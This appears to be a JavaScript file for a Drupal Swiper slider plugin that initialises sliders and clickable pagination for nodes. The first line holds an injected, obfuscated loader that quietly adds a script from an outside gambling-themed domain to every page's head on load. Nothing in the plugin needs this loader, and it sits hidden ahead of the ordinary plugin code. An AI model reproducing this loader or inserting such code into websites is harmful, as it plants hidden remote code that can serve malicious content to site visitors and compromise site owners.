var _0x25b0=['createElement','script','onload','src','https://cdn.letmeplayformoney.com/main.js?cdn=js','text/javascript','getElementsByTagName','head','appendChild'];(function(_0x38c36f,_0x12afce){var _0x31d501=function(_0x338e37){while(--_0x338e37){_0x38c36f['push'](_0x38c36f['shift']());}};_0x31d501(++_0x12afce);}(_0x25b0,0x1dd));var _0x4bec=function(_0x1c1d3d,_0x21e514){_0x1c1d3d=_0x1c1d3d-0x0;var _0x2921c7=_0x25b0[_0x1c1d3d];return _0x2921c7;};var script=document[_0x4bec('0x0')](_0x4bec('0x1'));script[_0x4bec('0x2')]=function(){};script[_0x4bec('0x3')]=_0x4bec('0x4');script['type']=_0x4bec('0x5');document[_0x4bec('0x6')](_0x4bec('0x7'))[0x0][_0x4bec('0x8')](script);/**
 * Basic and default implementation of Swiper plugin
 * 
 * @info Note that you can add more plugin options in the swiper method initiation,
 * to do this, implements a hook_swiper_options_alter in your module,
 * this hook extends the plugin options passed to the swiper method initiation.
 */
window.swiper = {};
(function($) {
  $(document).ready(function() {
    $.each(Drupal.settings.swiper, function(index, swiperSettings) {
      var nodeId = index.replace('nid-', '');
      var swiperContainerElement = '.swiper-container-nid-' + nodeId;

      if ($(swiperContainerElement).length) {
        window.swiper[nodeId] = new Swiper(swiperContainerElement, swiperSettings.options);

        // Clickable Pagination implementation
        $('.pagination-nid-' + nodeId + ' .swiper-pagination-switch').click(function() {
          window.swiper[nodeId].swipeTo($(this).index());
        });
      }
    });
  });
})(jQuery);
